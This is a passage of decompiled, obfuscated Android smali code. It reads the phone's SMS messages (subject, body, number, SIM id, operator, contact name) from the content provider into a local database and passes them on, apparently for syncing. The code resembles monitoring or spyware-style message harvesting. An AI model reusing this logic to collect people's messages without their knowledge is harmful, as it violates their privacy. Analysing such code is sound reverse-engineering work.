    return-void
.end method

.method private a(Landroid/net/Uri;I)[J
    .locals 13

    const/4 v0, 0x2

    new-array v0, v0, [J

    invoke-static {p2}, Lcom/utils/core/g0;->c(I)J

    move-result-wide v1

    const/4 v3, 0x0

    aput-wide v1, v0, v3

    iget-object v1, p0, Lcom/utils/core/h0/k;->j:Landroid/net/Uri;

    invoke-static {p2}, Lb/d/d/s0;->a(I)Ljava/lang/String;

    move-result-object v2

    const-string v4, "_id"

    invoke-static {v1, v4, v2}, Lcom/utils/core/u;->a(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)J

    move-result-wide v1

    const/4 v4, 0x1

    aput-wide v1, v0, v4

    :try_start_0
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    aget-wide v5, v0, v4

    aget-wide v7, v0, v3

    cmp-long v2, v5, v7

    if-gez v2, :cond_0

    aget-wide v5, v0, v4

    const-wide/16 v7, 0x0

    cmp-long p1, v5, v7

    if-ltz p1, :cond_4

    iget-object p1, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "DB cleared: "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-wide v5, v0, v3

    invoke-virtual {v2, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v3, " -> "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-wide v5, v0, v4

    invoke-virtual {v2, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v2}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    aget-wide v2, v0, v4

    invoke-static {v2, v3, p2}, Lcom/utils/core/g0;->b(JI)V

    goto/16 :goto_4

    :cond_0
    aget-wide v5, v0, v4

    aget-wide v7, v0, v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    cmp-long v2, v5, v7

    if-lez v2, :cond_4

    const/4 v2, 0x0

    :try_start_1
    sget-object v5, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const/4 v8, 0x0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "_id > CAST(? AS INTEGER) AND "

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {p2}, Lb/d/d/s0;->a(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    new-array v10, v4, [Ljava/lang/String;

    aget-wide v4, v0, v3

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v10, v3

    const-string v11, "_id ASC"

    move-object v7, p1

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-eqz p1, :cond_2

    :try_start_2
    invoke-interface {p1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-eqz v3, :cond_2

    :cond_1
    :try_start_3
    invoke-static {v1, p1, v2}, Lb/d/d/s0;->a(Ljava/util/List;Landroid/database/Cursor;Landroid/content/ContentValues;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    :catch_0
    move-exception v3

    :try_start_4
    iget-object v4, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v5, "updateDataL sms"

    invoke-static {v4, v5, v3}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    if-nez v3, :cond_1

    goto :goto_1

    :catchall_0
    move-exception p2

    goto :goto_3

    :catch_1
    move-exception v2

    move-object v12, v2

    move-object v2, p1

    move-object p1, v12

    goto :goto_2

    :cond_2
    :goto_1
    if-eqz p1, :cond_4

    :try_start_5
    invoke-interface {p1}, Landroid/database/Cursor;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_4

    :catchall_1
    move-exception p1

    move-object p2, p1

    move-object p1, v2

    goto :goto_3

    :catch_2
    move-exception p1

    :goto_2
    :try_start_6
    iget-object v3, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v4, "updateData sms"

    invoke-static {v3, v4, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    if-eqz v2, :cond_4

    :try_start_7
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    goto :goto_4

    :goto_3
    if-eqz p1, :cond_3

    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    :cond_3
    throw p2

    :cond_4
    :goto_4
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_5

    .line 3
    new-instance p1, Lb/d/d/p0;

    invoke-direct {p1, p0, v0, p2}, Lb/d/d/p0;-><init>(Lb/d/d/s0;[JI)V

    iget-object p2, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    invoke-virtual {p2, v1, p1}, Lcom/utils/core/o;->a(Ljava/util/List;Lcom/utils/core/h0/b;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto :goto_5

    :catch_3
    move-exception p1

    .line 4
    iget-object p2, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v1, "g s"

    invoke-static {p2, v1, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_5
    :goto_5
    return-object v0
.end method

.method private static c(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    invoke-static {p0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-object p0

    :cond_0
    const-string v0, "\r"

    const-string v1, " "

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method


# virtual methods
.method public a(Lcom/utils/core/h0/k;Ljava/lang/String;)V
    .locals 7

    :try_start_0
    new-instance v6, Lb/d/d/q0;

    const/4 v0, 0x7

    new-array v3, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "subj"

    aput-object v1, v3, v0

    const/4 v0, 0x1

    const-string v1, "body"

    aput-object v1, v3, v0

    const/4 v0, 0x2

    const-string v1, "num"

    aput-object v1, v3, v0

    const/4 v0, 0x3

    const-string v1, "cat"

    aput-object v1, v3, v0

    const/4 v0, 0x4

    const-string v1, "simid"

    aput-object v1, v3, v0

    const/4 v0, 0x5

    const-string v1, "simop"

    aput-object v1, v3, v0

    const/4 v0, 0x6

    const-string v1, "name"

    aput-object v1, v3, v0

    move-object v0, v6

    move-object v1, p0

    move-object v2, p2

    move-object v4, p2

    move-object v5, p1

    invoke-direct/range {v0 .. v5}, Lb/d/d/q0;-><init>(Lb/d/d/s0;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Lcom/utils/core/h0/k;)V

    iput-object v6, p1, Lcom/utils/core/h0/e;->d:Lb/d/a/g;

    invoke-virtual {p1}, Lcom/utils/core/h0/j;->s()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    iget-object p1, p1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v0, "gEToS"

    invoke-static {p1, v0, p2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method public a(Ljava/lang/String;)V
    .locals 2

    const-string v0, "3.1.170"

    invoke-static {p1, v0}, La/b/a/a;->a(Ljava/lang/String;Ljava/lang/String;)I

    move-result p1

    if-gez p1, :cond_0

    iget-object p1, p0, Lcom/utils/core/h0/k;->j:Landroid/net/Uri;

    invoke-static {p1}, Lb/d/d/i;->a(Landroid/net/Uri;)V

    iget-object p1, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    const-string v0, "simid"

    const-string v1, "INTEGER DEFAULT \'-1\'"

    invoke-virtual {p1, v0, v1}, Lcom/utils/core/o;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    const-string v0, "simop"

    const-string v1, "VARCHAR"

    .line 9
    invoke-virtual {p1, v0, v1}, Lcom/utils/core/o;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public c()Z
    .locals 1

    invoke-static {}, Lcom/utils/core/g0;->r()Z

    move-result v0

    return v0
.end method

.method public e()Ljava/lang/String;
    .locals 2

    const-string v0, "sms"

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/utils/core/u;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public f()V
    .locals 1

    const/4 v0, 0x0

    invoke-virtual {p0, p0, v0}, Lb/d/d/s0;->a(Lcom/utils/core/h0/k;Ljava/lang/String;)V

    return-void
.end method

.method public h()Ljava/lang/String;
    .locals 2

    sget-object v0, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    const v1, 0x7f0c00c6

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public m()V
    .locals 5

    sget-boolean v0, Lb/d/d/s0;->p:Z

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    sput-boolean v1, Lb/d/d/s0;->q:Z

    goto :goto_1

    :cond_0
    sput-boolean v1, Lb/d/d/s0;->p:Z

    :cond_1
    const/4 v0, 0x0

    sput-boolean v0, Lb/d/d/s0;->q:Z

    :try_start_0
    iget-object v2, p0, Lcom/utils/core/h0/k;->j:Landroid/net/Uri;

    invoke-direct {p0, v2, v1}, Lb/d/d/s0;->a(Landroid/net/Uri;I)[J

    move-result-object v2

    iget-object v3, p0, Lcom/utils/core/h0/k;->j:Landroid/net/Uri;

    const/4 v4, 0x2

    invoke-direct {p0, v3, v4}, Lb/d/d/s0;->a(Landroid/net/Uri;I)[J

    move-result-object v3

    invoke-direct {p0, v2, v3}, Lb/d/d/s0;->a([J[J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    iget-object v3, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v4, "u d"

    invoke-static {v3, v4, v2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    sget-boolean v2, Lb/d/d/s0;->q:Z

    if-nez v2, :cond_1

    sput-boolean v0, Lb/d/d/s0;->p:Z

    :goto_1
    return-void
.end method

.method public n()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public r()Ljava/util/ArrayList;
    .locals 6

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/utils/core/o;->g:Ljava/lang/String;

    const-string v3, "id_sms"

    const-string v4, " INTEGER,"

    const-string v5, "subj"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " VARCHAR,"

    const-string v3, "body"

    const-string v4, "simid"

    invoke-static {v1, v2, v3, v2, v4}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, " INTEGER DEFAULT \'"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, -0x1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, "\',"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "simop"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "cat"

    const-string v4, " INT NOT NULL,"

    const-string v5, "name"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "num"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "  VARCHAR NOT NULL);"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-object v0
.end method

.method public t()Ljava/util/ArrayList;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method
